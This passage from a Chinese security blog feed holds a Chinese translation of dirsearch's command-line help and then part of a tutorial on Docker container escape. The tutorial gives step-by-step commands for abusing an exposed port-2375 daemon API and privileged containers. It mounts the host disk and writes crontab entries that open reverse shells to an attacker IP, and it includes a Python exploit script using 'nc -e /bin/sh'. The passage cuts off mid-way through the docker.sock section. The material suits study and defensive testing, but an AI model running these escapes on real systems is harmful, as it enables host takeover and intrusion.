    <content type="html"><![CDATA[<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p>官方项目</p><p><a href="https://github.com/orf/dirscan">orf&#x2F;dirscan</a></p><p>增强版项目</p><p><a href="https://github.com/lemonlove7/dirsearch_bypass403">dirsearch_bypass403</a></p><h1 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs routeros">用法: dirsearch.py [-u|--url] 目标 [-e|--extensions] 扩展名 [选项]<br><br>示例：<br>dirsearch.py -l PATH -e *.* -i 200-399,403 -r <span class="hljs-attribute">--min-response-size</span>=1 -o out.txt<br><br> <br>选项:<br>  --version             显示程序版本号并退出<br>  -h, --help            显示帮助信息并退出<br> <br>  必填项:<br>    -u URL, <span class="hljs-attribute">--url</span>=URL   目标 URL(s)，可以使用多个标志<br>    -l PATH, <span class="hljs-attribute">--url-file</span>=PATH<br>                        URL 列表文件<br>    --stdin             从 STDIN 读取 URL(s)<br>    <span class="hljs-attribute">--cidr</span>=CIDR         目标 CIDR<br>    <span class="hljs-attribute">--raw</span>=PATH          从文件加载原始 HTTP 请求（使用 <span class="hljs-string">&#x27;--scheme&#x27;</span> 标志设置协议）<br>    -s SESSION_FILE, <span class="hljs-attribute">--session</span>=SESSION_FILE<br>                        会话文件<br>    <span class="hljs-attribute">--config</span>=PATH       配置文件的路径（默认使用 <span class="hljs-string">&#x27;DIRSEARCH_CONFIG&#x27;</span> 环境变量，否则使用 <span class="hljs-string">&#x27;config.ini&#x27;</span>）<br> <br>  字典设置:<br>    -w WORDLISTS, <span class="hljs-attribute">--wordlists</span>=WORDLISTS<br>                        自定义字典（用逗号分隔）<br>    -e EXTENSIONS, <span class="hljs-attribute">--extensions</span>=EXTENSIONS<br>                        用逗号分隔的扩展名列表（例如 php,asp）<br>    -f, --force-extensions<br>                        在每个字典条目的末尾添加扩展名。默认情况下，dirsearch 只用扩展名替换 %EXT% 关键字<br>    -O, --overwrite-extensions<br>                        使用您的扩展名（通过 `-e` 选择）覆盖字典中的其他扩展名<br>    <span class="hljs-attribute">--exclude-extensions</span>=EXTENSIONS<br>                        用逗号分隔的扩展名列表排除（例如 asp,jsp）<br>    --remove-extensions<br>                        移除所有路径中的扩展名（例如 admin.php -&gt; admin）<br>    <span class="hljs-attribute">--prefixes</span>=PREFIXES<br>                        添加自定义前缀到所有字典条目（用逗号分隔）<br>    <span class="hljs-attribute">--suffixes</span>=SUFFIXES<br>                        添加自定义后缀到所有字典条目，忽略目录（用逗号分隔）<br>    -U, --uppercase     字典转为大写<br>    -L, --lowercase     字典转为小写<br>    -C, --capital       字典首字母大写<br> <br>  通用设置:<br>    -t THREADS, <span class="hljs-attribute">--threads</span>=THREADS<br>                        线程数<br>    -r, --recursive     递归爆破<br>    --deep-recursive    对每个目录深度执行递归扫描（例如 api<span class="hljs-built_in">/users </span>-&gt; api/)<br>    --force-recursive   对每个找到的路径执行递归爆破，不仅限于目录<br>    -R DEPTH, <span class="hljs-attribute">--max-recursion-depth</span>=DEPTH<br>                        最大递归深度<br>    <span class="hljs-attribute">--recursion-status</span>=CODES<br>                        递归扫描的有效状态代码，支持范围（用逗号分隔）<br>    <span class="hljs-attribute">--subdirs</span>=SUBDIRS   扫描给定 URL[s]的子目录（用逗号分隔）<br>    <span class="hljs-attribute">--exclude-subdirs</span>=SUBDIRS<br>                        在递归扫描期间排除以下子目录（用逗号分隔）<br>    -i CODES, <span class="hljs-attribute">--include-status</span>=CODES<br>                        包括状态代码，用逗号分隔，支持范围（例如 200,300-399）<br>    -x CODES, <span class="hljs-attribute">--exclude-status</span>=CODES<br>                        排除状态代码，用逗号分隔，支持范围（例如 301,500-599）<br>    <span class="hljs-attribute">--exclude-sizes</span>=SIZES<br>                        通过大小（用逗号分隔）排除响应（例如 0B,4KB）<br>    <span class="hljs-attribute">--exclude-text</span>=TEXTS<br>                        通过文本排除响应，可以使用多个标志<br>    <span class="hljs-attribute">--exclude-regex</span>=REGEX<br>                        通过正则表达式排除响应<br>    <span class="hljs-attribute">--exclude-redirect</span>=STRING<br>                        如果正则表达式（或文本）与重定向 URL 匹配，则排除响应（例如 <span class="hljs-string">&#x27;/index.html&#x27;</span>）<br>    <span class="hljs-attribute">--exclude-response</span>=PATH<br>                        排除类似于此页面响应的响应，以路径为输入（例如 404.html）<br>    <span class="hljs-attribute">--skip-on-status</span>=CODES<br>                        每当命中其中一个状态代码时跳过目标，用逗号分隔，支持范围<br>    <span class="hljs-attribute">--min-response-size</span>=LENGTH<br>                        最小响应长度（单位：B）<br>    <span class="hljs-attribute">--max-response-size</span>=LENGTH<br>                        最大响应长度（单位：B）<br>    <span class="hljs-attribute">--max-time</span>=SECONDS  扫描的最大运行时间<br>    --exit-on-<span class="hljs-built_in">error</span>     每当发生错误时退出<br> <br>  请求设置:<br>    -m METHOD, <span class="hljs-attribute">--http-method</span>=METHOD<br>                        HTTP 方法（默认: GET）<br>    -d DATA, <span class="hljs-attribute">--data</span>=DATA<br>                        HTTP 请求数据<br>    <span class="hljs-attribute">--data-file</span>=PATH    包含 HTTP 请求数据的文件<br>    -H HEADERS, <span class="hljs-attribute">--header</span>=HEADERS<br>                        HTTP 请求头，可以使用多个标志<br>    <span class="hljs-attribute">--header-file</span>=PATH  包含 HTTP 请求头的文件<br>    -F, --follow-redirects<br>                        跟随 HTTP 重定向<br>    --random-agent      为每个请求选择随机 User-Agent<br>    <span class="hljs-attribute">--auth</span>=CREDENTIAL   身份验证凭证（例如 user:password 或 bearer token）<br>    <span class="hljs-attribute">--auth-type</span>=TYPE    身份验证类型（basic, digest, bearer, ntlm, jwt, oauth2）<br>    <span class="hljs-attribute">--cert-file</span>=PATH    包含客户端证书的文件<br>    <span class="hljs-attribute">--key-file</span>=PATH     包含客户端证书私钥的文件（未加密）<br>    <span class="hljs-attribute">--user-agent</span>=USER_AGENT<br>    <span class="hljs-attribute">--cookie</span>=COOKIE<br> <br>  连接设置:<br>    <span class="hljs-attribute">--timeout</span>=TIMEOUT   连接超时<br>    <span class="hljs-attribute">--delay</span>=DELAY       请求之间的延迟<br>    <span class="hljs-attribute">--proxy</span>=PROXY       代理 URL（HTTP/SOCKS），可以使用多个标志<br>    <span class="hljs-attribute">--proxy-file</span>=PATH   包含代理服务器的文件<br>    <span class="hljs-attribute">--proxy-auth</span>=CREDENTIAL<br>                        代理身份验证凭证<br>    <span class="hljs-attribute">--replay-proxy</span>=PROXY<br>                        重放找到的路径时使用的代理<br>    --tor               使用 Tor 网络作为代理<br>    <span class="hljs-attribute">--scheme</span>=SCHEME     原始请求的协议或 URL 中没有协议时使用的协议（默认: 自动检测）<br>    <span class="hljs-attribute">--max-rate</span>=RATE     每秒的最大请求数<br>    <span class="hljs-attribute">--retries</span>=RETRIES   失败请求的重试次数<br>    <span class="hljs-attribute">--ip</span>=IP             服务器<span class="hljs-built_in"> IP </span>地址<br>    <span class="hljs-attribute">--interface</span>=NETWORK_INTERFACE<br>                        要使用的网络接口<br> <br>  高级设置:<br>    --crawl             在响应中爬取新路径<br> <br>  显示设置:<br>    --full-url          在输出中显示完整的 URL（在安静模式下自动启用）<br>    --redirects-history<br>                        显示重定向历史<br>    --no-color          无彩色输出<br>    -q, --quiet-mode    安静模式<br> <br>  输出设置:<br>    -o PATH, <span class="hljs-attribute">--output</span>=PATH<br>                        输出文件<br>    <span class="hljs-attribute">--format</span>=FORMAT     报告格式（可用: simple, plain, json, xml, md, csv, html, sqlite）<br>    <span class="hljs-attribute">--log</span>=PATH          日志文件<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>黑客工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一文讲清Docker逃逸</title>
    <link href="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/"/>
    <url>/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<p><strong>Docker</strong></p><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/001-0.webp" alt="图片"></p><p>docker是一个用Go语言实现的开源项目，可以方便地创建和使用容器，docker将程序以及程序所有的依赖都打包到docker container，这样程序可以在任何环境都会有一致的表现，这里程序运行的依赖也就是容器就好比集装箱，容器所处的操作系统环境就好比货船或港口，程序的表现只和集装箱有关系(容器)，和集装箱放在哪个货船或者哪个港口(操作系统)没有关系。不会再有“在我的环境上可以运行”，真正实现“build once, run everywhere”。</p><p><strong>Docker的安全性</strong></p><p>讨论Docker的安全性主要在以下几个方面进行讨论：</p><ul><li><p>Docker容器是否会危害到宿主机或其他容器；</p></li><li><p>镜像的安全性用户如何确保下载下来的镜像是可信的、未被篡改过的；</p></li><li><p>Docker daemon的安全性如何确保发送给daemon的命令是由可信用户发起的。</p></li></ul><p>Docker之所以会出现安全性问题，根源在于<strong>容器和宿主机共用内核</strong>，因此受攻击面特别大；另外，如果容器里的应用导致Linux内核崩溃，整个系统也会随之崩溃。这一点与虚拟机是不同的，虚拟机与宿主机的接口非常有限，而且虚拟机崩溃一般不会导致宿主机崩溃。在共用内核的前提下，容器主要通过内核的Cgroup和Namespace这两大特性来达到容器隔离和资源限制的目的。目前Cgroup对系统资源的限制比较完善，但Namespace的隔离还是不够完善，只有PID、mount、network、UTS、IPC和user这几种手段。而对于未隔离的内核资源，容器访问时也会存在影响到宿主机及其他容器的风险。比如，procfs里的很多接口都未隔离，通过procfs可以查询到整个系统的信息，包括系统的CPU、内存等资源信息，所以Docker容器的procfs是以只读方式挂载的，否则修改procfs里的内核参数将会影响甚至破坏宿主机。内核syslog也是没有被隔离的，因此在容器内可以看到容器外其他进程产生的内核syslog。因此，Namespace的隔离非但是不完善的，甚至是不可能完善的。这是共用内核导致的固有缺陷，并且未来Linux内核社区也不会对此做太多的改进。在众多风险中，如果从虚拟机容器权限中逃逸出来，获取了宿主机权限，则为“虚拟机逃逸”，今天在这里做详细介绍。轻功护身，随意逃逸~</p><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/002-0.webp" alt="图片"></p><p> </p><h1 id="如何确认是在docker容器中？"><a href="#如何确认是在docker容器中？" class="headerlink" title="如何确认是在docker容器中？"></a>如何确认是在docker容器中？</h1><p><strong>方法一：检查根目录下是否存在.dockerenv文件</strong></p><p>如果根目录下存在.dockerenv文件，说明是在docker容器中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">ls -al /<br></code></pre></td></tr></table></figure><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/003-0.png" alt="图片"></p><p><strong>方法二：检查 &#x2F;proc&#x2F;1&#x2F;cgroup 是否存在含有docker字符串</strong></p><p>查询系统进程的cgroup信息，存在docker字段则是在docker容器中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">cat /proc/1/cgroup<br></code></pre></td></tr></table></figure><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/004-0.webp" alt="图片">   </p><p> </p><h1 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h1><h2 id="1、docker-daemon-api未授权访问"><a href="#1、docker-daemon-api未授权访问" class="headerlink" title="1、docker daemon api未授权访问"></a>1、docker daemon api未授权访问</h2><p><strong>漏洞原理</strong>   </p><p>在使用docker集群管理工具的时候，节点上会开放一个TCP端口2375，绑定在0.0.0.0上，如果我们使用HTTP的方式访问会返回404</p><p><strong>利用思路</strong></p><p>通过挂载宿主机的目录，写定时任务获取shell，从而逃逸。</p><p><strong>影响版本</strong></p><p>Docker &lt;&#x3D; 18.09.9</p><p><strong>关键步骤</strong></p><p>1、环境模拟：创建容器，进入容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker -H xx.xx.xx.xx:2375 run -it --privileged alpine /bin/sh<br></code></pre></td></tr></table></figure><p>2、查看本地磁盘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">fdisk -l<br></code></pre></td></tr></table></figure><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/005-0.webp" alt="图片"></p><p>3、创建测试目录，并将本地磁盘挂载在test目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">mkdir test<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">mount /dev/vda1 /test<br></code></pre></td></tr></table></figure><p>4、创建计划任务：</p><p>编辑 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root<br>添加计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain"> * * * * bash -i &gt;&amp; /dev/tcp/【攻击机器ip】/6666 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/006-0.webp" alt="图片"></p><p>反弹shell成功：</p><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/007-0.webp" alt="图片"></p><p>Exp 脚本:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">import docker  <br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">client = docker.DockerClient(base_url=&#x27;http://xx.xx.xx.xx:2375&#x27;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">data = client.containers.run(&#x27;alpine:latest&#x27;, r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc 目标ip 1234 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;, remove=True, volumes=&#123;&#x27;/etc&#x27;: &#123;&#x27;bind&#x27;: &#x27;/tmp/etc&#x27;, &#x27;mode&#x27;: &#x27;rw&#x27;&#125;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">print(data)<br></code></pre></td></tr></table></figure><h2 id="2、privileged-特权模式启动容器"><a href="#2、privileged-特权模式启动容器" class="headerlink" title="2、privileged 特权模式启动容器"></a>2、privileged 特权模式启动容器</h2><p><strong>特权模式与非特权模式的区别</strong></p><p><strong>区别一：Linux Capabilities</strong></p><ul><li><p>普通模式下容器内进程只可以使用有限的一些 Linux Capabilities</p></li><li><p>特权模式下的容器内进程可以使用所有的 linux capabilities</p></li></ul><p><strong>区别二：Linux敏感目录</strong>   </p><p>普通模式下，部分内核模块路径比如 &#x2F;proc 下的一些目录需要阻止写入、有些又需要允许读写， 这些文件目录将会以 tmpfs 文件系统的方式挂载到容器中，以实现目录 mask 的需求</p><p>特权模式下，这些目录将不再以 tmpfs 文件系统的方式挂载</p><p>Tmpfs说明:<a href="https://blog.51cto.com/u/_11495268/2424414">https://blog.51cto.com/u\_11495268/2424414</a></p><p><strong>区别三：内核文件的可读写性</strong></p><p>普通模式下，部分内核文件系统(sysfs、procfs)会被以只读的方式挂载到容器中，以阻止容器内进程随意修改系统内核</p><p>特权模式下，内核文件系统将不再以只读的方式被挂载</p><p><strong>区别四：AppArmor与Seccomp</strong></p><p>AppArmor：<a href="https://www.cnblogs.com/zlhff/p/5464862.htmlSeccomp%EF%BC%9Ahttps://en.wikipedia.org/wiki/Seccomp">https://www.cnblogs.com/zlhff/p/5464862.htmlSeccomp：https://en.wikipedia.org/wiki/Seccomp</a></p><p>普通模式下，可以通过配置 AppArmor 或 Seccomp 相关安全选项 （如果未配置的话，容器引擎默认也会启用一些对应的默认配置） 对容器进行加固</p><p>特权模式下，这些 AppArmor 或 Seccomp 相关配置将不再生效</p><p><strong>区别五：cgroup读写</strong></p><p>默认模式下，只能以只读模式操作 cgroup</p><p>特权模式下，将可以对 cgroup 进行读写操作</p><p><strong>区别六：&#x2F;dev</strong></p><p>普通模式下，容器内 &#x2F;dev 目录下看不到节点 &#x2F;dev 目录下特有的 devices</p><p>特权模式下，容器内的 &#x2F;dev 目录会包含这些来自节点 &#x2F;dev 目录下的那些内容</p><p><strong>区别七：SELinux</strong></p><p>特权模式下，SELinux 相关的安全加固配置将被禁用。</p><p>普通模式下也可以通过对应的安全选项来禁用 SELinux 特性</p><p><strong>漏洞原理</strong></p><p>特权模式逃逸是一种最简单有效的逃逸方法，使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，可直接通过chroot切换根目录、写ssh公钥和crontab计划任何等逃逸到宿主机。</p><p><strong>关键步骤</strong></p><p>1、环境搭建：</p><p>拉取一个镜像，在启用时使用–privileged。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker pull ubuntu:16.04<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker run -itd --privileged ubuntu:16.04 /bin/bash<br></code></pre></td></tr></table></figure><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/008-0.webp" alt="图片"></p><p>2、漏洞验证</p><p>判断是否是特权模式启动，如果是以特权模式启动的话，CapEff对应的掩码值应该为0000003fffffffff。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">cat /proc/self/status |grep Cap<br></code></pre></td></tr></table></figure><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/009-0.png" alt="图片"></p><p>3、漏洞利用</p><p>在docker容器中查看系统磁盘分区情况，在新建一个目录，将宿主机所在磁盘挂载到新建的目录中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">Plain Text<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">fdisk -l<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">mkdir /hacker<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">mount /dev/sda5 /hacker<br></code></pre></td></tr></table></figure><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/010-0.webp" alt="图片"></p><p>进入到hacker目录,通过touch创建一个sh文件，再将bash反弹命令写入到创建的sh文件里面，在编写计划任务到&#x2F;hacker&#x2F;etc&#x2F;crontab文件中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">touch /hacker/hacker.sh<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">echo &quot;bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/6666 0&gt;&amp;1&quot; &gt;/hacker/hacker.sh<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">echo &quot;* * * * * root bash /hacker.sh&quot; &gt;&gt; /hacker/etc/crontab<br></code></pre></td></tr></table></figure><p>返回到kali中进行查看，已成功接收到shell。</p><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/011-0.webp" alt="图片"></p><h2 id="3、挂载docker-sock"><a href="#3、挂载docker-sock" class="headerlink" title="3、挂载docker.sock"></a>3、挂载docker.sock</h2><p><strong>什么是docker.sock</strong></p><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/012-0.webp" alt="图片"></p><p>docker.sock 是docker client 和docker daemon 在localhost进行通信的socket文件</p><p>Docker 守护进程可以通过三种不同类型的 Socket 监听 Docker Engine API 请求：unix, tcp, and fd。默认情况下，在 &#x2F;var&#x2F;run&#x2F;docker.sock 中创建一个 unix 域套接字（或 IPC 套接字）</p><p><strong>环境搭建</strong></p><p><strong>创建docker</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04<br></code></pre></td></tr></table></figure><p><img src="/2024/08/07/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/013-0.webp" alt="图片"></p><p>随后在docker容器中安装docker：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain"># ubuntu 18.04安装docker<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">apt-get update<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain"># 安装依赖包<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain"># 添加 Docker 的官方 GPG 密钥<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain"># 验证您现在是否拥有带有指纹的密钥<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">apt-key fingerprint 0EBFCD88<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain"># 设置稳定版仓库<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain"># 更新<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">apt-get update<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain"># 安装最新的Docker-ce  <br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">apt-get install docker-ce<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain"># 启动<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">systemctl enable docker<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 